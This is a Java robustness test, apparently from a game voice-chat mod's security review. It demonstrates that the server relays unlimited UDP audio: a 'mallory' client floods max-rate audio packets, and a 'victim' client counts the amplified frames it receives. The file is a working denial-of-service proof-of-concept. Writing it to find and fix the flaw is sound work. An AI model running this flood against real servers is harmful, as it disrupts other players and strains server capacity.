package com.enn3developer.gtnhvoice.robustness;

import java.util.UUID;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicLong;

import com.enn3developer.gtnhvoice.core.proto.packets.Packet;
import com.enn3developer.gtnhvoice.core.proto.packets.udp.clientbound.SourceAudioPacket;

/**
 * Finding: the server applies NO rate limit to the serverbound UDP audio path. A single authenticated
 * client (Mallory) can send {@code PlayerAudioPacket}s as fast as the wire allows; {@code
 * VoiceServerManager.onPacket} -&gt; {@code routeAudio} fans EVERY frame out to every in-range voice
 * session with no per-speaker cap and no coalescing. The hello control channel has an explicit
 * {@code HelloRateLimiter}; the audio path - the far higher-volume one - has nothing equivalent.
 *
 * <p>Concretely this stands up TWO honest-looking sessions in one process:
 * <ul>
 *   <li><b>victim</b> - logs in normally, pings so the server learns its UDP address, then just
 *       receives and counts inbound {@code SourceAudioPacket}s (the relayed audio).</li>
 *   <li><b>mallory</b> - logs in normally, then floods max-size (2 KiB payload) {@code
 *       PlayerAudioPacket}s at line rate for a fixed window.</li>
 * </ul>
 * Both spawn at world spawn, so the proximity router delivers Mallory's audio to the victim. A
 * legitimate speaker is bounded to ~50 frames/s by the 20 ms client frame cadence; Mallory is bounded
 * only by her uplink. The victim's socket, AES-GCM decrypt and Opus decode are all driven at Mallory's
 * arbitrary rate - a server-amplified DoS of an honest third party, plus a matching load on the
 * server's own UDP egress that scales with the number of nearby players.
 *
 * <p>Observable evidence: the victim reports how many frames / how many bytes it received in the
 * window; divide by the window to get the delivered rate, and compare to the ~50/s a real speaker
 * could ever produce.
 */
public final class AudioRelayFlood {

    private static final int PAYLOAD_SIZE = 960; // realistic opus-ish frame size (cap is 2048)

    public static void main(String[] args) throws Exception {
        String host = args.length > 0 ? args[0] : "127.0.0.1";
        int port = args.length > 1 ? Integer.parseInt(args[1]) : 25565;
        int floodSeconds = args.length > 2 ? Integer.parseInt(args[2]) : 5;
        // Paced send rate (frames/s). Kept below the kernel UDP-buffer drop threshold so we measure the
        // SERVER's relay behaviour, not loopback saturation - yet still ~100x a legit 20ms speaker.
        int targetRate = args.length > 3 ? Integer.parseInt(args[3]) : 5000;

        CountDownLatch victimReady = new CountDownLatch(1);
        AtomicBoolean stop = new AtomicBoolean(false);
        AtomicLong victimFrames = new AtomicLong();
        AtomicLong victimBytes = new AtomicLong();

        Thread victimThread = new Thread(() -> {
            try (VoiceSession victim = Client.connect(host, port)
                .username("victimbot")
                .establish()) {

                // Let the server learn our UDP address so routeAudio has somewhere to deliver.
                victim.enlargeReceiveBuffer(4 * 1024 * 1024);
                victim.ping()
                    .ping()
                    .ping();
                System.out.println("[relay] victim up: sessionId=" + victim.getSessionId());
                victimReady.countDown();

                while (!stop.get()) {
                    byte[] frame = victim.receiveUdp(200);
                    if (frame == null) continue;
                    Packet<?> packet = victim.decode(frame);
                    if (packet instanceof SourceAudioPacket) {
                        victimFrames.incrementAndGet();
                        victimBytes.addAndGet(frame.length);
                    }
                }
            } catch (Exception e) {
                System.out.println("[relay] victim error: " + e);
                victimReady.countDown();
            }
        }, "victim");
        victimThread.start();

        victimReady.await();

        try (VoiceSession mallory = Client.connect(host, port)
            .username("mallory")
            .establish()) {

            // Ping so Mallory has a learned address + is a live speaker; both bots share world spawn so
            // the proximity router delivers her audio to the victim.
            mallory.ping()
                .ping();
            System.out.println("[relay] mallory up: sessionId=" + mallory.getSessionId());

            byte[] audio = new byte[PAYLOAD_SIZE];
            java.util.Arrays.fill(audio, (byte) 0x7f);
            UUID activationId = UUID.randomUUID();

            System.out.println("[relay] flooding PlayerAudioPackets for " + floodSeconds + "s at ~"
                + targetRate + " frames/s ...");
            long start = System.nanoTime();
            long deadline = start + floodSeconds * 1_000_000_000L;
            long nanosPerFrame = 1_000_000_000L / targetRate;
            long sent = 0;
            while (System.nanoTime() < deadline) {
                byte[] frame = mallory.encodePlayerAudio(sent, audio, activationId, (short) 0, false);
                mallory.sendUdp(frame);
                sent++;
                // Simple pacing: spin until this frame's slot elapses.
                long due = start + sent * nanosPerFrame;
                while (System.nanoTime() < due) { /* spin-pace */ }
            }
            double secs = (System.nanoTime() - start) / 1e9;
            System.out.printf("[relay] mallory sent %d frames in %.2fs = %.0f frames/s (%.1f MiB/s uplink)%n",
                sent, secs, sent / secs, sent * (double) PAYLOAD_SIZE / secs / (1024 * 1024));

            // Give the last relayed frames time to arrive at the victim.
            Thread.sleep(1500);
        } finally {
            stop.set(true);
            victimThread.join(4000);
        }

        long frames = victimFrames.get();
        long bytes = victimBytes.get();
        System.out.println("=================== RELAY AMPLIFICATION RESULT ===================");
        System.out.printf("victim received %d relayed SourceAudioPackets, %.1f MiB%n",
            frames, bytes / (1024.0 * 1024.0));
        System.out.printf("delivered rate ~= %.0f frames/s over the ~%ds window "
            + "(a real 20ms-cadence speaker maxes out at ~50/s)%n", frames / (double) floodSeconds, floodSeconds);
        System.out.println("==================================================================");
    }

    private AudioRelayFlood() {}
}
